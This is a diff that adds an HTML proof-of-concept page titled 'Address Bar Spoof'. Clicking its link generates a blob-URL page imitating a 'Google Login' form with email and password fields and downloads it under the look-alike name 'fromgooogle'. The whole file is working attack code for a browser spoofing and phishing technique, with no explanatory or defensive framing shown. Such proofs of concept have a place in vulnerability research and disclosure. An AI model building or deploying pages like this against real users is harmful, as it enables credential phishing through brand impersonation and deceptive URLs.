@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoof</title>
+</head>
+
+<body>
+
+    <a id="short" href="#">Spoof</a>
+    <br><br>
+
+    <script>
+        const short = document.getElementById('short');
+
+        short.addEventListener('click', (event) => {
+            var fileContent = `
+                <html>
+                <head>
+                <title>Google Login</title>
+                </head>
+                <body>
+                <h1>Google Login</h1>
+                Email : <input type="text"></input><br>
+                Password : <input type="password"></input>
+                <button>Login</button>
+                </body>
+                </html>
+            `;
+            var fileName = 'fromgooogle';
+
+            var blob = new Blob([fileContent], {
+                type: 'text/html'
+            });
+
+            event.target.href = window.URL.createObjectURL(blob);
+            setTimeout(() => {
+                event.target.download = fileName;
+            }, 10);
+        });
+    </script>
+
+
+</body>
+
+</html>
